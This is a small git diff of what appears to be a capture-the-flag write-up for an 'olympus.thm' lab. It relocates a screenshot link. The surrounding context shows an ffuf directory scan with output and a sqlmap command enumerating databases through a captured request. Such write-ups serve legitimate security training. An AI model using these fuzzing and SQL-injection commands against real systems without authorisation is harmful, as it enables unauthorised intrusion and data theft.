@@ -36,7 +36,6 @@ echo "10.10.27.68 olympus.thm" >> /etc/hosts
 ```
 ![image](https://user-images.githubusercontent.com/90036439/223972505-ab22dc4d-99b4-4295-96e5-7d3ec9145d5a.png)
 
-![image](https://user-images.githubusercontent.com/90036439/223974836-e8de8d9a-c3f8-43d0-91da-08e3753e8d06.png)
 
 ```bash
 root@ip-10-10-70-200:~# ffuf -u http://olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 
@@ -73,6 +72,7 @@ static                  [Status: 301, Size: 311, Words: 20, Lines: 10]
 :: Progress: [4655/4655] :: Job [1/1] :: 33790 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
 ```
 ![image](https://user-images.githubusercontent.com/90036439/223973205-ac9467ee-8ca2-43be-906c-0b69d4c14fcf.png)
+![image](https://user-images.githubusercontent.com/90036439/223974836-e8de8d9a-c3f8-43d0-91da-08e3753e8d06.png)
 
 ```bash
 sqlmap -r victorCMS-search.request --dbs
